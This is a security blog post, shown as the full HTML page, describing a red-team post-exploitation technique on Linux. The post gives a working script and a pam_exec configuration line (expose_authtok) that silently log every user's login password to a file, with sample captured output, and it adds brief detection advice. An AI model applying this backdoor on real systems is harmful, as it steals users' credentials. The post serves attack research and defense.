<!DOCTYPE html>
<html lang="en-us">
<head prefix="og: http://ogp.me/ns#"><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <meta name="description" content="Pluggable Authentication Modules (PAM) on Unix based systems are useful to change logon behavior and enforce authentication via various means.
In &ldquo;Red …" />
  <link rel="canonical" href="http://localhost:1313/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/" />
  <meta property="og:title" content=" Post Exploitation: Sniffing Logon Passwords with PAM &middot;  Embrace The Red" />
  <meta property="og:description" content="Pluggable Authentication Modules (PAM) on Unix based systems are useful to change logon behavior and enforce authentication via various means.
In &ldquo;Red …" />
  <meta property="og:site_name" content="Embrace The Red" />
  <meta property="og:url" content="http://localhost:1313/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/" />
  <meta property="og:type" content="article" />
  <meta property="og:article:published_time" content="2022-06-26T22:50:18-08:00" />
  <meta property="og:article:tag" content="pentest" />
  <meta property="og:article:tag" content="red" />
  <meta property="og:article:tag" content="research" />

  <title>
     Post Exploitation: Sniffing Logon Passwords with PAM &middot;  Embrace The Red
  </title>

  <link rel="stylesheet" href="http://localhost:1313/blog/css/bootstrap.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/blog/css/main.css" />
  <link rel="stylesheet" href="http://localhost:1313/blog/css/font-awesome.min.css" />
  <link rel="stylesheet" href="http://localhost:1313/blog/css/github.css" />
  
  <link rel="stylesheet" href="http://localhost:1313/blog/fonts/cachedfonts.css" type="text/css">
  <link rel="shortcut icon" type="image/x-icon" href="http://localhost:1313/blog/images/favicon.ico" />
  <link rel="apple-touch-icon" type="image/x-icon" href="http://localhost:1313/blog/images/favicon.ico" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@wunderwuzzi23">
<meta name="twitter:title" content="Post Exploitation: Sniffing Logon Passwords with PAM">
<meta name="twitter:description" content="Living off the land PAM usage to install a backdoor for password sniffing.">
<meta name="twitter:image" content="https://embracethered.com/blog/images/2022/pam.auth-config.png">

<meta name="twitter:creator" content="@wunderwuzzi23">



  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "\"Post Exploitation: Sniffing Logon Passwords with PAM\"",
    "description": "\"Pluggable Authentication Modules (PAM) on Unix based systems are useful to change logon behavior and enforce authentication via various means.\\nIn \\u0026ldquo;Red …\"",
    "author": {
      "@type": "Person",
      "name": "wunderwuzzi",
      "url": "https://x.com/wunderwuzzi23"
    },
    "publisher": {
      "@type": "Organization",
      "name": "\"Embrace The Red\"",
      "logo": {
        "@type": "ImageObject",
        "url": "http:\/\/localhost:1313\/blog\/images/favicon.ico"
      }
    },
    "url": "\"http://localhost:1313/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/\"",
    "datePublished": "\"2022-06-26T22:50:18-08:00\"","dateModified": "\"2022-06-26T22:50:18-08:00\"",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "\"http://localhost:1313/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/\""
    }
  }
  </script>

</head>
<body>
    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
    <section class="header-text">
      <h1><a href="http://localhost:1313/blog/">Embrace The Red</a></h1>
      
      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
        wunderwuzzi&#39;s blog
        <br><div style="color: greenyellow; font-weight:400;">learn the hacks, stop the attacks.</div> 
      </div>
      
      <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>

      
      <a href="http://localhost:1313/blog/" class="btn-header btn-back hidden-xs">
        <i class="fa fa-angle-left" aria-hidden="true"></i>
        &nbsp;Home
      </a>
      
    
      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
        <i class="fa fa-rss" aria-hidden="true"></i>
        &nbsp;RSS
      </a>
    </section>
  </header>
  <main class="container">


<article>
  <header>
    <h1 class="text-primary">Post Exploitation: Sniffing Logon Passwords with PAM</h1>
    <div class="post-meta clearfix">
    
      <div class="post-date pull-left">
        Posted on
        <time datetime="2022-06-26T22:50:18-08:00">
          Jun 26, 2022
        </time>
      </div>
    
      <div class="pull-right">
        
        <span class="post-tag small"><a href="http://localhost:1313/blog//tags/pentest">#pentest</a></span>
        
        <span class="post-tag small"><a href="http://localhost:1313/blog//tags/red">#red</a></span>
        
        <span class="post-tag small"><a href="http://localhost:1313/blog//tags/research">#research</a></span>
        
      </div>
    </div>
  </header>
  <section>
    <p>Pluggable Authentication Modules (PAM) on Unix based systems are useful to change logon behavior and enforce authentication via various means.</p>
<p>In &ldquo;Red Team Strategies&rdquo; the chapter &ldquo;Protecting the Pentester&rdquo; walks the reader through the configuration of a PAM module to get notified in real-time via a pop-up when someone logs on to the machine (e.g. system compromise).</p>
<p>But there are also <strong>bad things</strong> that can be done with PAM (especially post-exploitation) and this is what this post is about.</p>
<p>This post discusses a living-off-the-land PAM tactic that grabs passwords of logons, and we also discuss detection techniques.</p>
<p>Let&rsquo;s get going.</p>
<p>Assume that during a red team exercise a Linux host was compromised.</p>
<h3 id="creation-of-the-toomanysecretssh-script">Creation of the toomanysecrets.sh script</h3>
<p>First, we create a bash script that will be invoked whenever a new authentication occurs.</p>
<pre tabindex="0"><code>#!/bin/sh
echo &#34; $(date) $PAM_USER, $(cat -), From: $PAM_RHOST&#34; &gt;&gt; /var/log/toomanysecrets.log
</code></pre><p>The variables are PAM specific and will become available via the <code>pam_exec.so</code> module.</p>
<p>Here is the meaning of the variables:</p>
<ul>
<li><strong>$PAM_USER:</strong> The username that was entered.</li>
<li><strong>$PAM_RHOST:</strong> The remote host (typically the IP Address)</li>
<li><strong>$(cat -):</strong> This reads <code>stdin</code>, and will contain the password that the script grabs</li>
<li>The results are piped into a log file at <code>/var/log/toomanysecrets.log</code></li>
</ul>
<p>To prevent all users from reading the file consider pre-creating it and running <code>chmod</code>, e.g.:</p>
<pre tabindex="0"><code>sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
</code></pre><p>Now let&rsquo;s plug this script into the PAM pipeline.</p>
<h3 id="updating-the-pam-configuration-file-common-auth">Updating the PAM configuration file <code>common-auth</code></h3>
<p>Next, the PAM configuration file needs to be updated the <code>pam_exec</code> module will be used to invoke the script.</p>
<p>There are various config files located in <code>/etc/pam.d/</code>, and we pick <code>common-auth</code>.</p>
<pre tabindex="0"><code>sudo nano /etc/pam.d/common-auth
</code></pre><p>On the very bottom of the file, add the following authentication module:</p>
<p><code>auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh</code></p>
<p>The options have the following meaning:</p>
<ul>
<li><strong>optional:</strong> Authenticaiton shouldn&rsquo;t fail if there is an error (it&rsquo;s not a required step)</li>
<li><strong>pam_exec.so:</strong> This is the living off the land PAM module that can invoke arbitrary scripts</li>
<li><strong>expose_authtok:</strong> This is the trick that allows to read the password via <code>stdin</code></li>
<li><strong>quiet:</strong> Don&rsquo;t show any errors to the user (if something doesn&rsquo;t work)</li>
<li>The last argument is the shell script that was created previously</li>
</ul>
<p><a href="/blog/images/2022/pam.auth-config.png"><img src="/blog/images/2022/pam.auth-config.png" alt="PAM configuration change"></a></p>
<p>Finally, make the file executable:</p>
<p><code>sudo chmod 700 /usr/local/bin/toomanysecrets.sh</code></p>
<h3 id="logon-and-be-surprised">Logon and be surprised</h3>
<p>Now, let&rsquo;s try this out and ssh from another machine, or login locally.</p>
<p>And then look at the log file:</p>
<pre tabindex="0"><code>$ sudo cat /var/log/toomanysecrets.log
 Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
 Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
 Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
</code></pre><p>Pretty neat, and tricky to catch.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Test EDR to catch modifications in PAM configurations (also binary patching or entirely replacing/backdooring existing ones)</li>
<li>Review the PAM modules and there configuration in your environments</li>
<li>Do a purple team exercise that focuses on PAM modules and related configuration files</li>
</ul>
<h2 id="conclusions">Conclusions</h2>
<p>PAM modules are powerful, they can be used to lock machines down add MFA to SSH sessions or notify the user when logons occur. However, the can also be misused post-exploitation by an adversary to do a variety of things, including as shown in this post to grab credentials of users.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://linux.die.net/man/8/pam_exec">pam_exec</a></li>
</ul>

  </section>
  <footer>
    
    
    
    <footer></footer><hr/>
    
    <ul class="pager">
      
      <li class="next"><a href="http://localhost:1313/blog/posts/2022/offensive-bpf-bpftrace-sniff-logon-pam-passwords/">Newer <span aria-hidden="true">&rarr;</span></a></li>
      
      
      <li class="author-contact">
        <a href="mailto:security@wunderwuzzi.net">
          <i class="fa fa-envelope-o" aria-hidden="true"></i>
          &nbsp;Contact me
        </a>
     </li>

      
      
      <li class="previous"><a href="http://localhost:1313/blog/posts/2022/hacker-shell-prompts/"><span aria-hidden="true">&larr;</span> Older</a></li>
      
    </ul>
  </footer>
</article>
</main>
  <footer class="container global-footer">
    <div class="copyright-note pull-left">
     
     (c) WUNDERWUZZI 2018-2026
     <div class="sns-links hidden-print">
  
  <a href="mailto:security@wunderwuzzi.net">
    <i class="fa fa-envelope"></i>
  </a>
  
  
  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-twitter"></i>
  </a>
  
  
  
  
  
  <a href="https://github.com/wunderwuzzi23" target="_blank">
    <i class="fa fa-github"></i>
  </a>
  
  
  
  
  
  <a href="https://youtube.com/@embracethered" target="_blank">
    <i class="fa fa-youtube"></i>
  </a>
  
  
  
  <a href="/blog/index.xml" target="_blank">
    <i class="fa fa-rss"></i>
  </a>
</div>
 
     <div style="font-size:small;font-style: italic;color:crimson">
    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
    </div>
    </div>
</footer>
  <script src="http://localhost:1313/blog/js/highlight.pack.js"></script>
  <script>
    hljs.initHighlightingOnLoad();
  </script>
  
  



<script type="text/javascript">
  var _paq = window._paq || [];
  _paq.push(["disableCookies"]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//wuzzi.net/anamato/inc/";
    _paq.push(['setTrackerUrl', u+'rts.php']);
    _paq.push(['setSiteId', '1']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
  
</body>
</html>

